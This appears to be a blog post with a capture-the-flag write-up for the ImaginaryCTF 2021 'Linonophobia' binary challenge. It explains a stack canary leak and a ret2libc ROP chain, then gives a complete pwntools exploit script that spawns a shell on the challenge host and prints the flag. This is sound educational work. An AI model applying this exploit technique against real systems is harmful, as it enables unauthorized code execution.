<!DOCTYPE html>
<html lang="en-us">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="theme-color" content="#252627">
	<meta name="msapplication-TileColor" content="#252627">
<meta itemprop="name" content="ImaginaryCTF 2021 - Linonophobia">
<meta itemprop="description" content="Binary Exploitation Challenge from ImaginaryCTF 2021"><meta itemprop="datePublished" content="2021-07-28T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-07-28T00:00:00+00:00" />
<meta itemprop="wordCount" content="507">
<meta itemprop="keywords" content="Binary Exploitation," /><meta property="og:title" content="ImaginaryCTF 2021 - Linonophobia" />
<meta property="og:description" content="Binary Exploitation Challenge from ImaginaryCTF 2021" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bminus.io/posts/linonophobia/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-07-28T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-07-28T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="ImaginaryCTF 2021 - Linonophobia"/>
<meta name="twitter:description" content="Binary Exploitation Challenge from ImaginaryCTF 2021"/>

	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
	<link rel="shortcut icon" href="/favicon.ico">

	<title>ImaginaryCTF 2021 - Linonophobia</title>
	<link rel="stylesheet" href="https://bminus.io/css/style.min.f74778e3020c87c304fb5982e09b92ba63a5c7f202996d4c7283d6057acfe9c1.css" integrity="sha256-90d44wIMh8ME+1mC4JuSumOlx/ICmW1McoPWBXrP6cE=" crossorigin="anonymous">
	
</head>

<body id="page">
	
	<header id="site-header" class="animated slideInUp">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="https://bminus.io">bminus</a>
				</div>
				<nav class="site-nav hide-in-mobile">
					
				<a href="https://bminus.io/posts/">Posts</a>

				</nav>
			</div>
			<div class="hdr-right hdr-icons">
				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/brymars1" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://github.com/0xbam" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
			<li><a href="https://bminus.io/posts/">Posts</a></li>
		</ul>
	</div>


	<main class="site-main section-inner animated fadeIn faster">
		<article class="thin">
			<header class="post-header">
				<div class="post-meta"><span>Jul 28, 2021</span></div>
				<h1>ImaginaryCTF 2021 - Linonophobia</h1>
			</header>
			<div class="content">
				<pre><code>linonophobia: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d9ab76f92a8c23256cf5d524565e8c2d24e9bf55, for GNU/Linux 3.2.0, not stripped
</code></pre><p>This is a 64 bit dynamically linked binary challenge.</p>
<pre><code>[*] '/data/imaginary_ctf/linonophobia/linonophobia'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Using checksec, we can see that PIE is disabled which will allow us to use data addresses as gadgets without a leak.</p>
<h2 id="reverse-engineering">Reverse Engineering<a href="#reverse-engineering" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>Analyzing the binary in Ghidra, we can see the vulnerable section of code in main.</p>
<p><img src="/img/imaginary-linonophobia/ghidra-decompile.png" alt="Pasted image 20210802100934.png"></p>
<p>The program first calls read to allow user input followed by a printf with no format specifier. The function ends on one final read. At first glance, this seems like a format string vulnerability that can be used for arbitrary read and write. However, there is a loop at the beginning of main that performs an interesting action.</p>
<p><img src="/img/imaginary-linonophobia/uninitialized.png" alt="Pasted image 20210802101531.png"></p>
<p>The associated variable with this loop is uniniatialized meaning that the value is based off the whatever value is at its memory location. Locally, this loop does nothing and allows us to exploit the format string vulnerabilty. On the remote host, the loop changes printf to puts, preventing us from abusing format string to leak.</p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>We can still gain control of RIP this way but its no longer possible to ignore the canary. We will have to leak the canary and ROP from there. We can get a shell on the remote host by doing the following:</p>
<ol>
<li>Leak the canary with the first read call</li>
<li>Leak the libc puts address and call main again using ROP</li>
<li>ROP with libc leaked and call system</li>
</ol>
<p>Putting it all together, we have the following exploit script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;/usr/bin/tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split-w&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./linonophobia&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chal.imaginaryctf.org&#39;</span><span class="p">,</span> <span class="mi">42006</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">b *0x00401299
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">MAIN</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
<span class="n">CANARY_OFFSET</span> <span class="o">=</span> <span class="mi">264</span>
<span class="n">RET_ADDR_OFFSET</span> <span class="o">=</span> <span class="n">CANARY_OFFSET</span> <span class="o">+</span> <span class="mi">16</span>
<span class="n">PLT_PUTS</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">GOT_PUTS</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">POP_RDI_RET</span> <span class="o">=</span> <span class="mh">0x00401353</span>
<span class="n">POP_RSI_R15_RET</span> <span class="o">=</span> <span class="mh">0x00401351</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">264</span> <span class="o">+</span> <span class="s2">&#34;#&#34;</span><span class="p">)</span>

<span class="c1"># Capture Canary Leak</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;#&#34;</span><span class="p">)</span>

<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">((</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="kc">False</span><span class="p">)[:</span><span class="mi">7</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked Canary value @ &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>

<span class="c1"># Leak libc puts address and return to main using ROP</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="p">{</span>
        <span class="n">CANARY_OFFSET</span> <span class="p">:</span> <span class="n">canary</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="p">:</span> <span class="n">POP_RDI_RET</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">8</span> <span class="p">:</span> <span class="n">GOT_PUTS</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">16</span> <span class="p">:</span> <span class="n">PLT_PUTS</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">24</span> <span class="p">:</span> <span class="n">MAIN</span>
    <span class="p">}</span>
<span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">libc_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked libc puts address @ &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_puts</span><span class="p">))</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_puts</span> <span class="o">-</span> <span class="mh">0x0875a0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Calculated libc base  @ &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span>  <span class="o">+</span> <span class="mh">0x1b75aa</span>

<span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x055410</span>

<span class="c1"># Pwn</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Pwning!!!&#34;</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="p">{</span>
        <span class="n">CANARY_OFFSET</span> <span class="p">:</span> <span class="n">canary</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="p">:</span> <span class="n">POP_RDI_RET</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">8</span>  <span class="p">:</span> <span class="n">bin_sh_addr</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">16</span> <span class="p">:</span> <span class="n">POP_RSI_R15_RET</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">24</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">32</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">RET_ADDR_OFFSET</span> <span class="o">+</span> <span class="mi">40</span> <span class="p">:</span> <span class="n">libc_system</span>
    <span class="p">}</span>
<span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;pwned&#34;</span><span class="p">)</span>


<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>Running this script will return a shell and allow us to read the flag!</p>
<p>Flag: <code>ictf{str1ngs_4r3_null_t3rm1n4t3d!_b421ba9f}</code></p>

			</div>
			<hr class="post-end">
			<footer class="post-info">
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path><line x1="16" y1="8" x2="2" y2="22"></line><line x1="17.5" y1="15" x2="9" y2="15"></line></svg>map[name:bminus]</p>
				<p>
					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://bminus.io/tags/binary-exploitation">Binary Exploitation</a></span>
				</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>507 Words</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-07-28 00:00 &#43;0000</p>
			</footer>
		</article>
		<div class="post-nav thin">
			<a class="prev-post" href="https://bminus.io/posts/some-really-ordinary-program/">
				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Nahamcon 2021 - Some Really Ordinary Program</span>
			</a>
		</div>
		<div id="comments" class="thin">
</div>
	</main>

	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
		<p>&copy; 2021 <a href="https://bminus.io">bminus</a></p>
		<p>
		</p>
	</footer>



	<script src="https://bminus.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
	

</body>

</html>
